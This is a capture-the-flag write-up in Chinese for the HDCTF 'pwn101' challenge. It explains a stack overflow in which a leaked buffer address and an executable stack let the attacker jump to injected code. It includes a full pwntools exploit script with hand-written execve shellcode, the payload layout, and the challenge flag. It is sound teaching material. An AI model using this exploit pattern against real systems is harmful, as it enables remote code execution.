---
title: "pwn101：栈地址都报给你了"
date: "2026-09-12"
categories: "Pwn"
tags: ["shellcode", "栈溢出", "地址泄漏"]
excerpt: "利用泄露的栈地址覆盖返回地址，跳到可执行栈中的手写 shellcode。"
slug: "hdctf-ret2shellcode"
source_event: "HDCTF"
---

> 复现材料：`题目二进制`、`题目交互服务`。赛题附件未随文章打包。本文日期取自原始题解文件的修改日期。

程序往 0x40 的栈缓冲区里 `read` 0x100 字节，读之前还用 `printf` 把缓冲区地址直接打印出来。栈可执行、无 canary、无 PIE，溢出点就是现成的 shellcode 入口。

## 漏洞

`main` 的相关部分：

```c
char buf[0x40];
printf("Have a gift, your buffer is at: %p\n", buf);   // 栈地址白给
printf("Now, give me something interesting: ");
read(0, buf, 0x100);                                   // 越界写栈
```

偏移 0x48 覆盖返回地址，填回 `buf` 即跳到我们写入的代码。

## 利用

payload 布局：

```
[shellcode][A * (0x48 - len(shellcode))][p64(buf)]
```

两个实际踩到的坑：

1. `cat /flag` 不能和 payload 一起发。`read` 一次最多读 0x100 字节，命令发早了会被一并读进缓冲区，shell 起来后 stdin 已经空了。先发 payload，等 `read` 返回再发命令。
2. pwntools 自带的 `shellcraft.sh()` 在这个远端起不来 shell，换成手写 23 字节的 `execve("/bin//sh")` 就正常。

```python
# solve.py
from pwn import *
import time

context.arch = "amd64"
context.log_level = "info"

io = remote("challenge.example.invalid", 30975)

io.recvuntil(b"is at: ")
buf = int(io.recvline().strip(), 16)
log.info("buffer @ %#x", buf)
io.recvuntil(b"interesting: ")

shellcode = asm("""
    xor esi, esi
    push rsi
    mov rbx, 0x68732f2f6e69622f
    push rbx
    mov rdi, rsp
    push 0x3b
    pop rax
    xor edx, edx
    syscall
""")

payload = shellcode + b"A" * (72 - len(shellcode)) + p64(buf)
io.send(payload)
time.sleep(0.3)

io.sendline(b"cat /flag")
print(io.recvall(timeout=4).decode("latin-1"))
```

## Flag

```
HDCTF{31d3fd83-2d16-ba8a-bef9-349385be0231}
```

根因就一句：`read` 越界写栈，配合白给的栈地址和可执行栈，直接变成 shellcode 入口。
